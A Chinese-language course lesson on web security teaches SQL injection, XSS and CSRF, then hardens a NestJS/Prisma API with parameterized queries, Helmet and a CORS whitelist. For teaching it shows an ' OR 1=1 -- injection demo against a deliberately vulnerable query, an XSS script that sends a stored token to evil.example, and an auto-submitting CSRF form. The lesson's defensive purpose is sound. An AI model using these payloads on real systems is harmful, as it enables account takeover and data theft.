# 第 5 周 · Day 6：Web 安全三件套——SQL 注入、XSS、CSRF 一次讲透

> 对应手册任务：学习「Web 安全：SQL 注入、XSS、CSRF」，动手「用 Prisma 参数化查询验证防注入；配置 Helmet + CORS」，当日产出「安全加固配置」。本篇只解决一个问题：本周 Day 1 到 Day 5 把门锁装好了，但史上大多数拖库盗号，锁都没坏——攻击者骗的是屋里的自己人：数据库相信你拼的 SQL，浏览器相信页面里的脚本，服务器相信浏览器自动带来的 cookie。今天逐个看清这三种信任是怎么被滥用的，再用参数化查询和 Helmet + CORS 把自家 API 加固一遍。

## 今日目标

1. 说得清三种攻击的成因各一句话：注入源于字符串拼接、XSS 源于未转义输出、CSRF 源于 cookie 自动携带
2. 掌握三个防线要点：Prisma 参数化为什么免疫注入（含 `$queryRaw` 的正确姿势）、React/Vue 默认转义与两个危险口、Helmet 与 CORS 白名单的配置语义
3. 独立完成注入对比实验——同一条恶意输入打拼接查询和参数化查询各一次，再给 `apps/api` 挂上 Helmet + CORS，用 curl 亲眼看到响应头下发、白名单外来源被拦

## 概念讲解：为什么认证做完了还挡不住攻击

Day 1 到 Day 5 解决的是「你是谁、你能干什么」：JWT 验明正身，Guard 守门，RBAC 分权限，OAuth 接第三方。这些都是和「正常人」打交道的机制。攻击者不走这道门。

三种经典攻击的共同点一句话：**利用系统对某种输入的无条件信任**。数据库信任拼进 SQL 的每一个字符，浏览器信任页面里的每段标记，服务器信任随请求而来的 cookie。攻击者不撬锁，只是把恶意内容伪装成「被信任的那种输入」，让系统自己人干掉自己人。

这个思路会陪你走很远。第 19 周讲 Agent 安全时的提示词注入，利用的是「模型信任上下文里的每一句话」，和 SQL 注入同一族——人质从数据库换成模型，套路一模一样。今天把三门基本功练掉，那周你会觉得眼熟。

## 核心知识

本节的代码跑在前两周攒下的底座上：monorepo 里的 `apps/api`，NestJS + Prisma + PostgreSQL。Day 1–5 的认证产物都在，随用随取。

### 1. SQL 注入：数据库太相信你拼的字符串

从一段假想的登录查询看起。把用户输入的邮箱直接拼进 SQL 文本：

```ts
const sql = `SELECT id, email, name FROM "User" WHERE email = '${email}'`;
```

正常输入没问题。攻击者在邮箱框输入 `' OR 1=1 --`，拼出来的 SQL 变成：

```sql
SELECT id, email, name FROM "User" WHERE email = '' OR 1=1 --'
```

拆开看三段各干什么：开头的 `'` 提前闭合字符串，把「输入」变成了「代码」；`OR 1=1` 是恒真条件，WHERE 整个失效，返回全表；`--` 把残留的收尾引号注释掉，SQL 语法保持完整，不报错。登录逻辑若取「第一行」，攻击者就以表中第一个用户的身份进了门。登录绕过只是开胃菜，真正的拖库武器是 `UNION SELECT`：把别的表的数据并进结果集一列列带出去，一次请求带走一张表。（至于 `'; DROP TABLE`，多语句执行通常被驱动拦着，反而少见。）

根子一句话：**用户输入和 SQL 代码共享同一个字符串**，数据库无从分辨哪段是你写的指令、哪段是用户的数据。参数化的解法就是把两者分开车道：SQL 模板先发给数据库预编译成执行计划，参数随后按位置绑定，绑定值永远只当数据比较，不会被当成 SQL 解析。`' OR 1=1 --` 从此只是「一个字面意思很奇怪的邮箱」，匹配不到任何行，查询老老实实返回空。

Prisma 在这件事上分三档：

- **Prisma Client 高级 API**（`findUnique`、`findMany` 等）：连 SQL 文本都不存在，字段和值全是结构化参数，最安全，能用就用。
- **`$queryRaw` 的 tag 模板写法**：插值自动变成绑定参数，安全。

```ts
const found = await prisma.$queryRaw`
  SELECT id, email, name FROM "User" WHERE email = ${email}
`;
```

- **`$queryRawUnsafe(sql, ...values)`**：名字自带警告。它接受一个已经拼好的字符串，拼的过程有没有注入，Prisma 管不着。

```ts
// 危险：模板字符串先把 email 拼进了 SQL 文本，再整体交给 Unsafe
await prisma.$queryRawUnsafe(`SELECT id FROM "User" WHERE email = '${email}'`);

// 可用：SQL 骨架和参数分开传，$1 是绑定参数占位
await prisma.$queryRawUnsafe(
  `SELECT id, email, name FROM "User" WHERE email = $1`,
  email,
);
```

还有两个边角：动态 IN 列表不能 `IN (${list.join(",")})`，要用 `Prisma.join` 展开成多个绑定参数；表名、列名、排序字段这类**标识符**没法当参数绑（参数只能绑值），动态标识符先过白名单映射，或者干脆用 Prisma Client 的 `orderBy` 结构化参数，连写错的机会都没有。

### 2. XSS：脚本混进你的页面，冒充你自己

注入的目标是数据库，XSS 注入的目标是**别人浏览器里的页面**。攻击者把脚本塞进你的页面，浏览器以为是你写的，给它页面的全部权限：读 localStorage（Day 3 的 token 就存在那）、以用户身份发请求、改页面内容。按投毒渠道分三型：

- **存储型**：恶意脚本经正常功能存进库（比如一条评论 `<script>fetch('//evil.example?t='+localStorage.accessToken)</script>`），之后每个打开页面的用户都中招，杀伤最大。
- **反射型**：URL 参数被服务端原样回显到页面，攻击者发你一条 `https://app.example.com/search?q=<script>...` 的链接，谁点谁中。
- **DOM 型**：服务端全程无辜，前端 JS 自己把不可信数据塞进 `innerHTML`，转义环节压根没发生。

防线的第一道墙是框架白送的：React 的 `{user.bio}`、Vue 的 `{{ user.bio }}` 都把值当纯文本渲染，`<script>` 会显示成字符而不是执行。真正的危险口是两个「后果自负」的逃生门：

```tsx
// React：绕过转义，bio 里是什么就执行什么
<div dangerouslySetInnerHTML={{ __html: user.bio }} />
```

```html
<!-- Vue：同款危险口 -->
<div v-html="user.bio"></div>
```

确实要渲染用户富文本时，先过一遍 `DOMPurify.sanitize` 再交给它们，没有例外。第二道墙是 CSP（马上随 Helmet 一起配）：限制页面允许加载的脚本来源，就算注入成功，inline 脚本也不执行——注意它是纵深防御的一层，不替代转义。

还记得 Day 3 选 token 存储方案时白纸黑字写的那句「前提是 XSS 防护做到位」吗？兑现的日子就是今天。XSS 防不住，localStorage 里的 token 就是被偷的命；防住了，Authorization 头方案的最大软肋才算堵上。

### 3. CSRF：浏览器太热心，替别人发了你的请求

cookie 有条二十年老规矩：只要域名对得上，浏览器自动携带，页面 JS 摸不到也拦不住。这在当年是好设计，在攻击者学会「借你的浏览器发请求」之后成了漏洞：

```html
<!-- 挂在 evil.example 上的钓鱼页，受害者已登录你的应用 -->
<form action="https://api.your-app.com/email/change" method="POST" hidden>
  <input name="email" value="attacker@evil.example">
</form>
<script>document.forms[0].submit();</script>
```

用户点开这个页面，浏览器向你的 API 发出改邮箱的 POST，并自动带上用户的 cookie。服务器一看 cookie 合法，当成用户本人处理，改了。攻击者全程拿不到响应，但不需要——他要的就是副作用。

防线三道，逐层递进。**SameSite**：现代浏览器已默认 `Lax`，跨站的 POST 表单、fetch、img 请求统统不带 cookie，上面那个钓鱼页当场哑火；`Strict` 更狠，连从外站点进来的顶级导航都不带，更安全但体验受伤。**CSRF token**：服务端发一个随机 token，写操作要求请求带上并校验，攻击者的页面跨域读不到你的页面内容，伪造不出来。**第三道是本项目的方案天然自带**：Day 1–5 的 token 走 `Authorization` 头，浏览器不会自动携带这个头，钓鱼页设不了也偷不着，CSRF 从物理上不成立——Day 3 说的「不自动带凭证，CSRF 从根上不存在」，论证今天补齐。哪天切回 httpOnly cookie 方案，前两道防线就得配齐。

## 动手任务：安全加固配置一步一步

手册任务：用 Prisma 参数化查询验证防注入，再配置 Helmet + CORS。拆成 5 步，全程约 30 分钟。

**第 1 步：注入对比实验。** 新建 `apps/api/src/security/inject-demo.ts`（实验用，第 5 步删）。前提：本地 PostgreSQL 在跑，`.env` 的 `DATABASE_URL` 可用，且 `User` 表里有一两行数据——空表会让「返回全表」这个效果看不见，没有就先随手插一行。

```ts
import { PrismaClient } from "@prisma/client";

const prisma = new PrismaClient();

async function main() {
  // 经典万能密码：闭合引号、恒真条件、注释收尾
  const evil = `' OR 1=1 --`;

  // 版本 A：字符串拼好再交给 Unsafe，注入成立
  const fragile = await prisma.$queryRawUnsafe(
    `SELECT id, email, name FROM "User" WHERE email = '${evil}'`
  );
  console.log("拼接版命中行数:", fragile.length);

  // 版本 B：tag 模板参数化，evil 只是「一个奇怪的邮箱」
  const safe = await prisma.$queryRaw`
    SELECT id, email, name FROM "User" WHERE email = ${evil}
  `;
  console.log("参数化版命中行数:", safe.length);
}

main()
  .catch(console.error)
  .finally(() => prisma.$disconnect());
```

在 `apps/api` 目录执行 `npx tsx src/security/inject-demo.ts`（tsx 会现场拉起，不用安装；换成你顺手的任何 TS 运行方式也行）。预期输出：拼接版命中行数等于全表行数，参数化版是 0。同一串输入、同一张表，唯一变量是「拼进 SQL」还是「绑成参数」，这个对比比读十篇文章都直观。

**第 2 步：记牢动态查询的正确姿势。** 把实验里 B 版的写法推广开：值用插值，列表用 `Prisma.join`，动态标识符走白名单。

```ts
import { Prisma } from "@prisma/client";

// 动态 IN：join 把数组展开成多个绑定参数
const emails = ["jerry@example.com", "tom@example.com"];
const byEmails = await prisma.$queryRaw`
  SELECT id, email FROM "User" WHERE email IN (${Prisma.join(emails)})
`;

// 动态排序列：标识符不能绑定参数，先过白名单映射
const SORTABLE = { createdAt: `"createdAt"`, name: `"name"` } as const;
type SortKey = keyof typeof SORTABLE;

function orderClause(sort?: string) {
  const key = (sort && sort in SORTABLE ? sort : "createdAt") as SortKey;
  return Prisma.raw(SORTABLE[key]); // 返回可安全嵌入的 SQL 片段
}
```

一句话总结：**值靠绑定，标识符靠白名单**。要拼更复杂的动态片段（比如可选的 WHERE 子句），用 `Prisma.sql` 组合成片段再嵌回模板，它和 `Prisma.join`、`Prisma.raw` 是一套，专门负责「以安全的方式拼 SQL」。而 `findMany({ orderBy: ... })` 这类结构化 API 两样都不用操心，能用就用。

**第 3 步：挂 Helmet。** 在仓库根目录执行 `pnpm --filter api add helmet`，然后改 `main.ts`，在 `NestFactory.create` 之后、`listen` 之前加：

```ts
import helmet from "helmet";

app.use(helmet());
```

一行换回十几个安全响应头，核心几个抄在表里，第 5 步 curl 马上能亲眼看到：

| 响应头 | Helmet 默认值 | 挡什么 |
| --- | --- | --- |
| Content-Security-Policy | `default-src 'self'; …` | XSS 第二道墙：来源之外的脚本（含 inline）不执行 |
| X-Frame-Options | `SAMEORIGIN` | 点击劫持：别的网站把你嵌进 iframe 诱骗点击 |
| Strict-Transport-Security | 仅 HTTPS 下发 | 强制浏览器走 HTTPS，防降级劫持 |
| X-Content-Type-Options | `nosniff` | 禁止浏览器猜 MIME，防「图片里藏脚本」 |
| Referrer-Policy | `no-referrer` | 别让 URL 里的 token 顺着 Referer 泄给第三方 |

两个提醒：本地 http 调试时看不到 HSTS，部署到 HTTPS 后自动出现；CSP 默认值对纯 API 够用，将来给前端页面配 CSP 要按实际加载的资源调，千万别为了省事一把 `unsafe-inline` 全开——那等于把这道墙拆了。

**第 4 步：配 CORS 白名单。** `main.ts` 续写：

```ts
// 允许的前端来源从环境变量读，逗号分隔，生产域名不进代码
const allowedOrigins = (process.env.CORS_ORIGINS ?? "http://localhost:5173")
  .split(",")
  .map((origin) => origin.trim());

app.enableCors({
  origin: allowedOrigins, // 精确匹配，名单外的 Origin 一律不回授权头
  credentials: true,      // 仅当需要跨域携带 cookie 时才有意义
});
```

`.env` 加一行 `CORS_ORIGINS=http://localhost:5173`，部署时再补生产域名。两条语义：`origin` 决定「谁的页面能读你的接口响应」，名单外的源请求照样发出，但浏览器不让脚本拿到数据；`credentials` 决定「跨域请求是否允许带 cookie」。红线一条：**`origin: "*"` 和 `credentials: true` 绝不同开**。规范层面，带凭证的响应禁止使用通配符 Origin，浏览器直接拒收；实践层面更怕 `origin: true`（反射任意来源）加 credentials，等于对所有网站敞开你用户的 cookie。要通配就别带凭证，要带凭证就老老实实白名单。本项目走 Authorization 头，`credentials` 其实用不上，但按最严标准配，将来切 cookie 方案不用返工。

**第 5 步：curl 双向验证 + 收尾。** 先看安全响应头：

```bash
curl -i http://localhost:3000/users/me
# 预期响应头里能看到（401 不妨碍，头照样下发）：
# content-security-policy: default-src 'self';...
# x-frame-options: SAMEORIGIN
# x-content-type-options: nosniff
# referrer-policy: no-referrer
```

`/users/me` 会被 Day 2 的 Guard 挡成 401，没关系，Helmet 的头挂在全局，401 也带。再看 CORS 的两组对照：

```bash
# 名单外的源：响应里不会出现 access-control-allow-origin
curl -i -X OPTIONS http://localhost:3000/auth/login \
  -H "Origin: http://evil.example" \
  -H "Access-Control-Request-Method: POST"

# 名单内的源：正常回显 access-control-allow-origin: http://localhost:5173
curl -i -X OPTIONS http://localhost:3000/auth/login \
  -H "Origin: http://localhost:5173" \
  -H "Access-Control-Request-Method: POST"
```

最后收尾：删掉 `inject-demo.ts`（里面有 `$queryRawUnsafe` 拼接示范，不该跟着项目过夜），`main.ts` 里的 `helmet()` 和 `enableCors` 留下，这就是当日产出「安全加固配置」。明天 Day 7 用 Postman 串整周链路时，顺手把这些头再扫一眼。

::: tip 上线后自检
本地只能 curl 自查，部署到有域名的地方后，拿 [securityheaders.com](https://securityheaders.com) 扫一遍，安全响应头配没配齐一目了然；注入面想再验一次，可以用 OWASP ZAP 对测试环境做一轮主动扫描。
:::

## 常见踩坑

**坑 1：以为危险的是 `$queryRaw`。** tag 模板的插值永远参数化，真正出事的是「先把字符串拼完再交给 `*_Unsafe`」：`$queryRawUnsafe(\`... ${email} ...\`)` 里，模板字符串先完成了拼接，Unsafe 拿到的已经是污染过的 SQL 文本。见到 Unsafe 就条件反射问一句：这个字符串在来这里的路上，碰过用户输入吗？

**坑 2：动态表名、列名、排序字段直接拼。** `ORDER BY ${sort}` 里的 sort 是标识符不是值，参数化绑不了它，直接拼就是注入口。白名单映射（第 2 步的 `SORTABLE`）或改用 Prisma Client 的 `orderBy` 结构化参数。值靠绑定，标识符靠白名单，两类不能混。

**坑 3：富文本需求一刀切上 `v-html` / `dangerouslySetInnerHTML`。** 评论、简介想支持加粗和图片，把原文直接塞进这两个口，等于亲手拆掉转义墙，重演存储型 XSS。要渲染用户富文本，先 `DOMPurify.sanitize` 过一遍再用；走 Markdown 渲染管线也一样，render 之后的 HTML 照样要 sanitize。

**坑 4：CORS 乱开。** 三个高频翻车：`origin: "*"` 配 `credentials: true`，浏览器直接拒收；`origin: true` 反射任意来源再开 credentials，比通配符更糟，等于定向敞开；白名单里写 `http://localhost:5173/`，末尾多个斜杠就精确匹配不上——Origin 是字符串全等比较。配完用第 5 步的两组 curl 亲自验一遍，别凭感觉。

**坑 5：把 Helmet 当万能药。** 响应头是纵深防御的一层：它挡不了 SQL 注入（数据库攻击根本不看响应头），CSP 里 `unsafe-inline` 全开时也挡不了 XSS。安全的主干永远是参数化查询、输出转义、不自动携带凭证，头是给漏网之鱼再添一道网。另外别为了调试「临时」在生产关掉某项 Helmet 配置，临时是安全事故的高发词。

## 自测问题

先自己答，再展开对照。答不上来的，回对应小节看一遍。

1. `' OR 1=1 --` 三段各干什么？参数化之后它为什么失效？

::: details 参考答案
`'` 提前闭合字符串字面量，把输入变成代码；`OR 1=1` 给 WHERE 加恒真条件，过滤失效返回全表；`--` 把残留的收尾引号注释掉，保证 SQL 语法完整不报错。参数化后，这条输入整体作为一个绑定参数参与等值比较，等价于「查找邮箱恰好等于 `' OR 1=1 --` 的用户」，数据库不会把它解析成指令，匹配不到就返回空。
:::

2. XSS 三型怎么分？为什么 React/Vue 插值默认安全，`dangerouslySetInnerHTML` 和 `v-html` 却危险？

::: details 参考答案
存储型：脚本经正常功能入库，所有浏览者中招；反射型：URL 参数被服务端原样回显，钓链接谁点谁中；DOM 型：前端 JS 自己把不可信数据写进 innerHTML，不经过服务端。插值表达式把值当纯文本渲染，`<script>` 显示为字符不执行；两个危险口把字符串当 HTML 解析，绕过转义，值里是什么就执行什么，喂入不可信内容前必须先过 DOMPurify。
:::

3. 为什么 Authorization 头方案天然免疫 CSRF？换 httpOnly cookie 方案要补哪些课？

::: details 参考答案
浏览器只自动携带 cookie，不会自动附加 Authorization 头；钓鱼页面既设不了这个头也偷不到 token，伪造出的请求没有凭证，服务器直接拒绝。换 cookie 方案要补：SameSite=Lax/Strict 限制跨站携带、CSRF token 的下发与校验、必要时校验 Origin/Referer。
:::

4. SameSite 的 Lax 和 Strict 差在哪？为什么说现代浏览器默认值帮了大忙？

::: details 参考答案
Lax：跨站子请求（POST 表单、fetch、img）不带 cookie，但用户点击链接的顶级 GET 导航仍带，安全与体验折中；Strict：连顶级导航都不带，从外站点进来第一个请求是未登录态，更安全但体验受损。主流浏览器已默认 Lax，大量没做 CSRF 防护的老应用没改一行代码就挡住了最经典的表单式攻击。
:::

5. CORS 的 `origin` 和 `credentials` 各控制什么？为什么「通配符 + 凭证」是红线？

::: details 参考答案
`origin` 控制哪些来源的页面被允许读取接口响应（名单外请求浏览器照发，但脚本拿不到数据）；`credentials` 控制跨域请求是否允许携带 cookie。规范禁止带凭证的响应使用通配符 Origin，浏览器直接拒收；更危险的是 `origin: true` 反射任意来源再开 credentials，等于让任意网站的页面带着用户 cookie 访问你的接口。要么白名单加凭证，要么通配符不带凭证，二选一。
:::

## 延伸阅读

- [OWASP：SQL Injection Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html)，防注入的权威清单，参数化、白名单、存储过程各是什么地位讲得清清楚楚
- [OWASP：Cross Site Scripting Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)，XSS 的上下文转义规则（HTML、属性、JS、URL 各有各的转义法）
- [MDN：跨源资源共享（CORS）](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/CORS)，浏览器视角的跨域机制，origin 与 credentials 的每条规则都能在这里找到出处

今天的产出是一段配置，外加一条肌肉记忆：凡是跟数据库、浏览器、模型说话的地方，先问一句「用户输入有没有可能被当成指令」。第 19 周讲 Agent 安全时会回到这句话——提示词注入就是 SQL 注入换了个人质，到那天你会感谢今天练过的直觉。
